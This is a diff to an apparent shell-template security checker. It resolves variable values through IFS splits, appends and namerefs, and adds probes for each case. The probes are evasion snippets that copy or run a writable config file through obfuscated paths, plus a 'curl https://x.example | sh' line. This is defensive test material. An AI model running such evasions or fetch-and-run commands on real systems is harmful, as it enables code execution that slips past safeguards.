@@ -2421,7 +2421,7 @@ ASSIGN_NAME_RE = re.compile(r"(?<![\w$])([A-Za-z_]\w*)(?:\[[^]]*\])?\+?=")
 
 
 def split_names(texts: list):
-    """(names, poisoned): the names whose assigned value an unquoted expansion splits
+    """(names, poisoned, seps): the names whose assigned value an unquoted expansion splits
     into more than one word (#5327). The gate reads one value as one operand, so such a
     name is not resolved: "/usr/bin/env <binary>" or "-c 0 <glob>" is a wrapper and a
     binary, or a glob, once split. The split characters are blank, tab and newline plus
@@ -2448,12 +2448,17 @@ def split_names(texts: list):
         val = re.sub(r"\$\([^()]*\)|`[^`]*`", "", unquote(word)[0])
         if name != "IFS" and (any(c in seps for c in val) or (poisoned and val)):
             out.add(name)
-    return out, poisoned
+    return out, poisoned, seps
 
 
 def var_values(stmts: list) -> dict:
     """NAME -> every literal text the template assigns it (assignment, export, local,
-    declare, for-loop word), for names never read from input (#5095)."""
+    declare, for-loop word) (#5095). A value only adds uses in expand_uses (the original
+    use stays), so a name an unquoted expansion splits keeps its values and also holds
+    each field (#5356); only a name read from input is left out (#5100). A nameref can
+    carry any name's value to any other name, so a template that declares one maps every
+    name to VALUES_PAST_CAP (ANY_NAME): every use through a name reads as the root use
+    (fail closed, #5356, #4869)."""
     vals, unknown = {}, set()
     for _w, stmt, _st in stmts:
         text = tf_render(stmt)
@@ -2477,16 +2482,25 @@ def var_values(stmts: list) -> dict:
             unknown.update(re.findall(r"(?<![\w$-])[A-Za-z_]\w*", m.group(1)))
         unknown.update(re.findall(r"\bprintf\s+-v\s*([A-Za-z_]\w*)", text))
         unknown.update(re.findall(r"\bgetopts\s+\S+\s+([A-Za-z_]\w*)", text))
-    refs, poisoned = nameref_facts([tf_render(stmt) for _w, stmt, _st in stmts])
-    if poisoned:
-        return {}
-    unknown |= split_names([tf_render(stmt) for _w, stmt, _st in stmts])[0]
-    return {k: v for k, v in vals.items() if k not in unknown and k not in refs}
+    texts = [tf_render(stmt) for _w, stmt, _st in stmts]
+    refs, poisoned = nameref_facts(texts)
+    if refs or poisoned:
+        return {ANY_NAME: {VALUES_PAST_CAP}}
+    # an IFS the gate cannot read leaves every split name unresolved in binary_vars, so
+    # each operand through one is red there; here the fields are cut on the known IFS
+    split, _poisoned, seps = split_names(texts)
+    cut = re.compile("[%s]+" % re.escape("".join(sorted(seps))))
+    for k in split & set(vals):
+        if VALUES_PAST_CAP not in vals[k]:
+            vals[k] = vals[k] | {f for v in vals[k] for f in cut.split(v) if f}
+    return {k: v for k, v in vals.items() if k not in unknown}
 
 
 EXPAND_CAP = 64
 # the value set of a name assigned more than EXPAND_CAP texts (#5329)
 VALUES_PAST_CAP = "\x00past-cap"
+# the var_values key that stands for every name, past the cap (#5356)
+ANY_NAME = "\x00any-name"
 
 
 def expand_uses(uses: list, values: dict) -> list:
@@ -2506,10 +2520,10 @@ def expand_uses(uses: list, values: dict) -> list:
         for _ in range(4):
             nxt = []
             for v in todo:
-                m = next((x for x in ref.finditer(v) if (x.group(1) or x.group(2)) in values), None)
+                m = next((x for x in ref.finditer(v) if ANY_NAME in values or (x.group(1) or x.group(2)) in values), None)
                 if m is None:
                     continue
-                reps = values[m.group(1) or m.group(2)]
+                reps = values.get(m.group(1) or m.group(2), values.get(ANY_NAME, set()))
                 over = over or VALUES_PAST_CAP in reps
                 for rep in reps - {VALUES_PAST_CAP}:
                     w = v[:m.start()] + rep + v[m.end():]
@@ -3132,6 +3146,10 @@ def build_probes() -> list:
         ('data-home file run through an append-built path, listed (#4837 R12 R5, #5174)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/run; F+=.conf; bash "$F"\n' + dec)]),
         ('data-home file run through an append-built path with a suffix, listed (#4837 R12 R5, #5174)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/run; F+=.conf; bash "$F".x\n' + dec)]),
         ('data-home file copied through an append chain past the value cap, listed (#4837 R12 R5, #5329)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/r; F+=u; F+=n; F+=.; F+=c; F+=o; F+=n; F+=f; cp "$F" /usr/local/bin/\n' + dec)]),
+        ('data-home file copied through a split append value, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      F=/etc/ai-memory/r; F+=\"un.conf /x\"; cp $F /usr/local/bin/\n" + dec)]),
+        ('data-home file copied through a field of an IFS split, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      IFS=:; F=x:/etc/ai-memory/r; F+=u*; cp $F /usr/local/bin/\n" + dec)]),
+        ('data-home file copied through a nameref, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      F=/etc/ai-memory/r; F+=un.conf; declare -n R=F; cp \"$R\" /usr/local/bin/\n" + dec)]),
+        ('data-home file built through a nameref and copied through its target, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      declare -n R=G; R=/etc/ai-memory/r; R+=un.conf; cp \"$G\" /usr/local/bin/\n" + dec)]),
         ('data-home file run through a nameref, listed (#4837 R12 R5, #5174)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      declare -n R=A; A=/etc/ai-memory/run.conf; bash "$R"\n' + dec)]),
         ('data-home file copied by tee from its stdin, then the copy run, listed (#4837 R12 R5, #5096)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      tee /usr/local/bin/r.sh < /etc/ai-memory/run.conf > /dev/null\n      bash /usr/local/bin/r.sh\n" + dec)]),
         ('data-home file copied by sed in a redirected group, then the copy run, listed (#4837 R12 R5, #5096)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      { sed 's/a/a/' /etc/ai-memory/run.conf; } > /usr/local/bin/r.sh\n      bash /usr/local/bin/r.sh\n" + dec)]),
@@ -3184,6 +3202,7 @@ def build_probes() -> list:
         autolist=True, present="is an expansion or command substitution")
     # a name read from input has no known value: its literal assignments are not expanded (#5095 pin, #5100)
     green("R3-C read names are not expanded from their assignments (#5100)", [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/etc/ai-; Q=memory/run.conf; read P Q < /dev/null; curl "$P$Q"\n' + dec)], autolist=True)
+    green("data-home file kept as data next to split and appended names that do not name it (#5356)", [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/var/r; F+="un.conf /x"; cp $F /usr/local/bin/; IFS=:; G=x:/var/r; G+=u*; cp $G /usr/local/bin/\n' + dec)], autolist=True)
     green("R3-C YAML comment line in runcmd is inert", [(RUNCMD, RUNCMD + "  # curl https://x.example | sh\n")])
     P.append(("R3-C AWS-only line copied into do-hive", "red", dict(do=[(dec, "      chown aimemory:aimemory /etc/ai-memory/store-url\n" + dec)], autolist=False)))
     # ---- validators
